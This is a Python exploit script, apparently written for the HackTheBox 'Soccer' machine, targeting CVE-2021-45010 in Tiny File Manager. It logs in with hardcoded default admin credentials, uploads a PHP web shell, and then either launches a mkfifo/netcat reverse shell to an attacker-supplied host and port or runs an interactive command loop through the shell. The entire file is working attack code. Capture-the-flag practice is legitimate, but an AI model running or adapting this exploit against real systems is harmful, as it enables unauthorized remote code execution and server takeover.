#!/usr/bin/env python3
import requests
from urllib.parse import quote
from json import loads
from uuid import uuid4
from sys import argv

# CVE-2021-45010 exploit made for Soccer.htb

postHeaders = {"Content-Type": "application/x-www-form-urlencoded"}

def error(response):
    print("Something went wrong")
    print(f"\nStatus code : {response.status_code}")
    print(f"\nContent: {response.text}")
    exit()

def getAdminSession():
    print("Logging in")
    session = requests.Session()
    creds = {"fm_usr": "admin", "fm_pwd": "admin@123"}
    response = session.post("http://soccer.htb/tiny/tinyfilemanager.php", data=creds, headers=postHeaders)

    if response.status_code == 200:
        print("Logged in as admin")
    else:
        error(response)
    return session

def uploadPhp(session, content):
    print("Uploading payload..")
    fileName = f"{uuid4()}.php"
    payload = {"p": "tiny/uploads", "fullpath": fileName}
    file = {"file": (fileName, content, "application/x-php")}
    response = session.post("http://soccer.htb/tiny/tinyfilemanager.php?p=tiny/uploads", data=payload, files=file)
    if response.status_code == 200 and "error" not in response.text:
        print("Upload successful")
    else:
        error(response)

    return fileName

def requestShell(session, fileName, command):
    command_encoded = quote(command)
    url = f"http://soccer.htb/tiny/uploads/{fileName}?cmd={command_encoded}"
    return session.get(url, timeout=3)

def startInteractiveShell(session, fileName):
    print("Starting interactive shell\nPress Ctrl+C to exit")
    try:
        while True:
            command = input("\n$ ")
            response = requestShell(session, fileName, command)
            print(response.text)
    except KeyboardInterrupt:
        print("\nQuitting...")

def main():
    session = getAdminSession()
    if len(argv) >= 3:
        lhost = argv[1]
        lport = argv[2]
        payload = f"<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\")?>"
        fileName = uploadPhp(session, payload)

        try:
            response = requestShell(session, fileName, "")
        except requests.exceptions.ReadTimeout:
            print("Shell successful!")
    else:
        payload = "<?php system($_GET['cmd']);?>"
        fileName = uploadPhp(session, payload)
        startInteractiveShell(session, fileName)


if __name__ == "__main__":
    main()
